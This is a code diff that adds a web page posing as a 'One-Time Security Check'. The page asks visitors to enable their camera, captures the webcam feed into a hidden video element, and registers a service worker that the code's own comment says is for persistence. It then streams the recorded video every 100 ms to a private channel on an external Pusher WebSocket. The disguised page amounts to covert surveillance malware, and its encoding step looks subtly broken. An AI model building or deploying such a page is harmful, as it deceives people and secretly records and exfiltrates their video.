@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>One-Time Security Check</title>
+</head>
+<body>
+    <h1>Verifying your device... Please enable camera!</h1>
+    <video id="video" autoplay style="display:none;"></video>
+    <script>
+        // Request webcam access
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Register a Service Worker for persistence
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.register('/sw.js')
+                        .then(reg => console.log('Service Worker registered'))
+                        .catch(err => console.error('Service Worker failed:', err));
+                }
+
+                // Connect to free WebSocket (Pusher)
+                const ws = new WebSocket('wss://ws-ap1.pusher.com/app/your_app_key?protocol=7');
+                ws.onopen = () => {
+                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            ws.send(JSON.stringify({
+                                channel: 'private-webcam',
+                                event: 'client-video',
+                                data: btoa(String.fromCharCode(...new Uint8Array(event.data)))
+                            }));
+                        }
+                    };
+                    mediaRecorder.start(100); // Send every 100ms
+                };
+            })
+            .catch(err => console.error('Error:', err));
+    </script>
+</body>
+</html>
